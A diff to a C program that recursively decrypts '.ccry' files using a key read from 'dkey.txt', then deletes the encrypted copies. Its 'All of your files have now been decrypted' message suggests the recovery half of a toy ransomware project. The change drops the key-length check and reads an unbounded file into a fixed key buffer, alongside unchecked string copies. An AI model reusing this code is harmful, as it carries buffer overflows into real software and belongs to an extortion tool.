@@ -64,28 +64,62 @@ char *remove_extension(char *s) {
     return new;
 }
 
-const char *root_dir_path = "./test";
+int check_extension(const char *str, const char *suffix) {
+    if (!str || !suffix)
+        return 0;
+    size_t lenstr = strlen(str);
+    size_t lensuffix = strlen(suffix);
+    if (lensuffix > lenstr)
+        return 0;
+    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
+}
 
-int main(void) {
-    DIR *root_dir = opendir(root_dir_path);
-    struct dirent *dir;
+char *root_dir_path = "./test_dir";
+unsigned char decrypt_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
+void decryptRecursively(char *basePath) {
+    char path[4096];
+    struct dirent *dp;
+    DIR *dir = opendir(basePath);
 
-    char *to_decrypt[512];
-    int i = 0;
-    if (root_dir) {
-        while ((dir = readdir(root_dir)) != NULL) {
-            if (!strcmp(dir->d_name, ".") || !strcmp(dir->d_name, "..")) {
-                // for some reason c prints out these two so just skip them
-                continue;
-            }
+    // Unable to open directory stream
+    if (!dir) {
+        char filename[256] = {0};
+        snprintf(filename, 255, "%s.ccry", basePath);
 
-            printf("decrypting %s...\n", dir->d_name);
-            to_decrypt[i] = dir->d_name;
-            ++i;
+        // check that the file is encrypted in the first place
+        if (!check_extension(basePath, ".ccry")) {
+            return;
         }
-        closedir(root_dir);
+
+        // remove the file extension to get the new name
+        char *new_file_name = remove_extension(basePath);
+
+        printf("decrypting %s\n", basePath);
+        if (decrypt(new_file_name, basePath, decrypt_key) != 0)
+            printf("Error encrypting file %s", basePath);
+
+        // after the file has been ecrypted delete it.
+        int r = remove(basePath);
+        if (r != 0) {
+            printf("error deleting file after encryption\n");
+        }
+        return;
+    } else {
+        while ((dp = readdir(dir)) != NULL) {
+            if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
+                char filename[256] = {0};
+                strcpy(path, basePath);
+                strcat(path, "/");
+                strcat(path, dp->d_name);
+                decryptRecursively(path);
+            }
+        }
     }
 
+    closedir(dir);
+}
+
+int main(void) {
     FILE *file = fopen("./dkey.txt", "r+");
     if (file == NULL)
         exit(EXIT_FAILURE);
@@ -93,23 +127,11 @@ int main(void) {
     long int size = ftell(file);
     fclose(file);
     file = fopen("./dkey.txt", "r+");
-    unsigned char *key = (unsigned char *)malloc(size);
-    int bytes_read = fread(key, sizeof(unsigned char), size, file);
+    int bytes_read = fread(decrypt_key, sizeof(unsigned char), size, file);
+
     fclose(file);
-
-    // check that the key is of the correct size
-    if (sizeof(key) != crypto_secretstream_xchacha20poly1305_KEYBYTES) {
-        exit(EXIT_FAILURE);
-    }
-
-    for (int j = 0; j < i; ++j) {
-        char *new_file_name = remove_extension(to_decrypt[j]);
-
-        if (decrypt(new_file_name, to_decrypt[j], key) != 0)
-            printf("error decryping file %s\n", to_decrypt[j]);
-    }
-
-    printf("All of your files have now beed decrypted have fun...\n");
+    decryptRecursively(root_dir_path);
+    printf("All of your files have now been decrypted.\nHave fun...\n");
 
     return EXIT_SUCCESS;
 }
